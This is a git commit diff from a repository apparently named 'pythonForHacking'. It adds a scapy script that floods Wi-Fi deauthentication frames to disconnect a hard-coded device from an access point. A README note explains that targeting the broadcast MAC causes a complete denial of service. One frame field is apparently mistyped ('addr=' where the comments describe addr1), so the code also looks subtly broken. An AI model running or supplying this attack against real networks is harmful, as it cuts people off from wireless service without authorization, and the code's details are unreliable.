3b4e0917901dcb9aac3e3959c3ac98a73be2e024
eduardoMag <eduardobautista13@gmail.com>
2021-02-24 21:59:54 -0600

    adding file and readme update

--- README.md
+++ README.md
@@ -1,2 +1,6 @@
 # pythonForHacking
 simple scripts written in python for hacking.
+
+[+] NOTE:
+***FOR SCRIPT 'wifi-disconnect-devices'***
+You can also set "ff:ff:ff:ff:ff:ff" (broadcast MAC address ) as addr1 (target_mac) and this will cause a complete denial of service, as no device can connect to that access point, this is quite harmful!
---
+++ scapyModule-scripts/wifi-disconnect-devices.py
@@ -0,0 +1,16 @@
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+from scapy.sendrecv import sendp
+
+
+# crafting the packet
+target_mac = "00:ae:fa:81:e2:5e"
+gateway_mac = "e8:94:f6:c4:97:3f"
+# 802.11 frame
+# addr1: destination MAC
+# addr2: source MAC
+# addr3: Access Point MAC
+dot11 = Dot11(addr=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+# stack them up
+packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+# send the packet
+sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
